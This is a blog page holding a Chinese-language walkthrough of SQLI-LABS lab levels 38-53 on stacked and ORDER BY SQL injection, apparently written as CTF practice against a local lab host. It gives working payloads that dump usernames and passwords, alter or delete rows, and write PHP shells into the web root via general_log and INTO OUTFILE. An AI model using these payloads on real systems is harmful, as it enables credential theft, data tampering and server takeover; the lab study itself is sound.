@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <title>
+        SQLI-LABS (Stacked Injections) 38-53关 |
+        
+        A.M.|P.M.
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"version":"3.0.4"};
+    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="page-container">
+
+    
+
+    <header class="page-header">
+        <div class="header-progress"></div>
+    </header>
+
+    <main class="page-main">
+
+        <div class="page-main-content">
+
+            <div class="page-main-content-top">
+                <header class="header-wrapper">
+
+    <div class="header-content">
+        <a class="logo-title" href="/">
+            A.M.|P.M.
+        </a>
+
+        <ul class="menu-list">
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/"
+                    >
+                        HOME
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/archives"
+                    >
+                        ARCHIVES
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/categories"
+                    >
+                        CATEGORIES
+                    </a>
+                </li>
+            
+        </ul>
+
+        <div class="menu-bar">
+            <div class="menu-bar-middle"></div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+            </div>
+
+            <div class="page-main-content-middle">
+
+                <main class="main-content normal-code-theme">
+
+                    
+                        <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">SQLI-LABS (Stacked Injections) 38-53关</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span>John_Frod</span>
+                        <span class="level">Lv2</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-calendar"></i> 2021-03-07 18:59:17
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/categories/CTF/">CTF</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id 参数直接带入到 SQL 语句中</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>)):</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysqli_error(<span class="variable">$con1</span>));</span><br></pre></td></tr></table></figure>
+<p>发现这里使用了**mysqli_multi_query($con1, $sql)**函数，这个函数用于执行一个SQL语句，或者多个使用分号分隔的SQL语句。</p>
+<ul>
+<li>利用方法</li>
+</ul>
+<p>理论上所有SQL语句都能执行，只不过不能显示结果出来而已。</p>
+<p>example：添加字段值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-38&#x2F;?id&#x3D;1&#39;;insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305212154622.png" alt="image-20210305212154622"></p>
+<ul>
+<li>开启日志Getshell</li>
+</ul>
+<p>需要条件：</p>
+<ol>
+<li>Web 的物理路径</li>
+<li>MySQL 可以读写 Web 目录</li>
+<li>Windows 成功率 高于 Linux</li>
+</ol>
+<p>首先查看当前日志的相关配置：</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305212549907.png" alt="image-20210305212549907"></p>
+<p>这里的日志并没有开启，尝试注入的时候手动开启：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-38&#x2F;?id&#x3D;1&#39;;set global general_log &#x3D; &quot;ON&quot;;set global general_log_file&#x3D;&#39;D:\\phpStudy\\PHPTutorial\\WWW\\shell.php&#39;;--+</span><br></pre></td></tr></table></figure>
+<p>然后再查看日志配置是否被修改了：</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305212932567.png" alt="image-20210305212932567"></p>
+<p>成功修改后尝试getshell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-38&#x2F;?id&#x3D;1&#39;;select &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>查看里面的日志：</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305213133319.png" alt="image-20210305213133319"></p>
+<p>此时已经成功写入了，访问该页面</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305213247027.png" alt="image-20210305213247027"></p>
+<h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>本关与Less-38的区别只是参数的数据类型为数字型，其他都一样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-38&#x2F;?id&#x3D;1;insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>本关与Less-38的区别只是参数闭合方式为<code>(&#39;$id&#39;)</code>，其他都一样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-38&#x2F;?id&#x3D;1&#39;);insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);</span><br></pre></td></tr></table></figure>
+<p>此外还有一些二次注入的文件在里面，不过好像没啥用。</p>
+<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>本关与Less-39的区别只是屏蔽了错误信息显示，其他都一样。</p>
+<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><ul>
+<li>查看源码<ul>
+<li>login.php</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># username 被过滤 &#x27; &quot; \ password 没有被</span></span><br><span class="line"><span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 堆叠查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询成功：</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysqli_error(<span class="variable">$con1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 登录成功:</span><br><span class="line">    setcookie(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);</span><br><span class="line">    跳转到 logged-in.php</span><br></pre></td></tr></table></figure>
+<p>这里的<code>login_password</code>参数没有进行过滤，同时使用了堆叠查询，因此可以从这里进行注入攻击。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;&#39; union select 1,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users),3--+</span><br></pre></td></tr></table></figure>
+<p>当然这里题目希望我们进行堆叠注入同样也是可以的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;&#39;;login_user&#x3D;admin&amp;login_password&#x3D;&#39;;Update users set password &#x3D; &#39;hacked&#39; where username &#x3D; &#39;admin&#39;#</span><br></pre></td></tr></table></figure>
+<p>这里把admin用户的密码改为了hacked。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306104434303.png" alt="image-20210306104434303"></p>
+<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>本关和Less-42一样，只不过闭合方式换成了<code>(&#39;$password&#39;)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;&#39;) union select 1,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users),3--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p>
+<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>本关与 Less-43 闭合方式一致为<code>(&#39;$password&#39;)</code>，只是这里少了报错注入的利用方法。</p>
+<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET 方式获取 sort 参数</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接将 id 带入 SQL 中</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询成功：</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
+<p>这里是在order by 注入，利用方法很多</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;(select updatexml(1,concat(0x7e,(select @@version),0x7e),1))</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>procedure analyse 参数后注入</strong></li>
+</ul>
+<p>利用 procedure analyse 参数，我们可以执行报错注入。同时，在 procedure analyse 和 orde r by 之间可以存在 limit 参数，我们在实际应用中，往往也可能会存在 limit 后的注入，可以 利用 procedure analyse 进行注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br></pre></td></tr></table></figure>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><ul>
+<li><strong>布尔盲注</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)</span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>时间盲注</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))</span><br><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</span><br></pre></td></tr></table></figure>
+<h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;1 into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;less46.txt&quot;</span><br></pre></td></tr></table></figure>
+<p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p>
+<ul>
+<li><strong>利用导出文件 getshell</strong>：</li>
+</ul>
+<p>使用lines terminated by 姿势用于 order by 的情况来 getsgell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;1 into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\shell.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure>
+<p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306114842456.png" alt="image-20210306114842456"></p>
+<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>本关和Less-46的区别在于参数由数字型变为了字符型，需要由<code>&#39;$sort&#39;</code>闭合，因此不能直接用<code>?sort=rand(xxxxxx)</code>这种方法进行注入，需要先把前面的字符先闭合了再使用and 接构造的语句<code>?sort=1&#39; and xxxx</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-47&#x2F;?sort&#x3D;1&#39; and (select updatexml(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e),1))--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以。</p>
+<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以。</p>
+<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>执行 sql 语句我们这里使用的是 **mysqli_multi_query()**函数，而之前我们使用的是 **mysqli _query()**，区别在于 **mysqli_multi_query()**可以执行多个 sql 语句，而 **mysqli_query()**只能执行 一个 sql 语句，那么我们此处就可以执行多个 sql 语句进行注入，也就是我们之前提到的 statcked injection。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-50&#x2F;?sort&#x3D;1;insert into users(username,password) values (&#39;hello1&#39;,&#39;world1&#39;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306150439345.png" alt="image-20210306150439345"></p>
+<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>这一关和 Less-50 相比只是参数数据类型变成了字符型，实际注入的时候只需做一下对应的闭合即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-51&#x2F;?sort&#x3D;1&#39;;delete from users where username &#x3D; &#39;hello1&#39;;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p>
+<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：SQLI-LABS (Stacked Injections) 38-53关</li>
+        <li>Post author：John_Frod</li>
+        <li>Create time：2021-03-07 18:59:17</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2021/03/07/SQLI-LABS (Stacked Injections) 38-53关/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/03/07/SQLi-LABS%20(Challenges)%2054-65%E5%85%B3/"
+                        >
+                            <span class="left arrow-icon flex-center" >
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">SQLi-LABS (Challenges) 54-65关</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/03/07/SQLI-LABS%20(Adv%20Injections)%2021-37%E5%85%B3/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">SQLI-LABS (Adv Injections) 21-37关</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center" >
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                    
+                </main>
+
+            </div>
+
+            <div class="page-main-content-bottom">
+                <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">John_Frod</a>
+        </div>
+        
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
+        </div>
+    </div>
+</footer>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="sidebar-tools">
+        <div class="tools-container">
+    <ul class="tools-list">
+        
+            <li class="search popup-trigger">
+                <i class="fas fa-search"></i>
+            </li>
+        
+
+        
+
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+    </ul>
+</div>
+
+    </div>
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-top flex-center">
+            <i class="fas fa-arrow-up"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="tools-ul-1">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+    </ul>
+</div>
+
+    </div>
+
+    <!-- page aside -->
+    <aside class="page-aside">
+        
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-38"><span class="nav-text">Less-38</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-39"><span class="nav-text">Less-39</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-40"><span class="nav-text">Less-40</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-41"><span class="nav-text">Less-41</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-42"><span class="nav-text">Less-42</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-43"><span class="nav-text">Less-43</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-44"><span class="nav-text">Less-44</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-45"><span class="nav-text">Less-45</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-46"><span class="nav-text">Less-46</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#into-outfile"><span class="nav-text">into outfile</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-47"><span class="nav-text">Less-47</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-48"><span class="nav-text">Less-48</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-49"><span class="nav-text">Less-49</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-50"><span class="nav-text">Less-50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-51"><span class="nav-text">Less-51</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-52"><span class="nav-text">Less-52</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-53"><span class="nav-text">Less-53</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol>
+    </div>
+</div>
+        
+    </aside>
+
+    <!-- image viewer -->
+    <div class="image-viewer-container">
+    <div class="img-box">
+        <img src="">
+    </div>
+</div>
+
+
+</div>
+
+
+
+    <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-icon">
+            <i class="fas fa-search"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/local-search.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/left-side-toggle.js"></script>
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/code-copy.js"></script>
+    
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/toc.js"></script>
+    
+
+
+</body>
+</html>
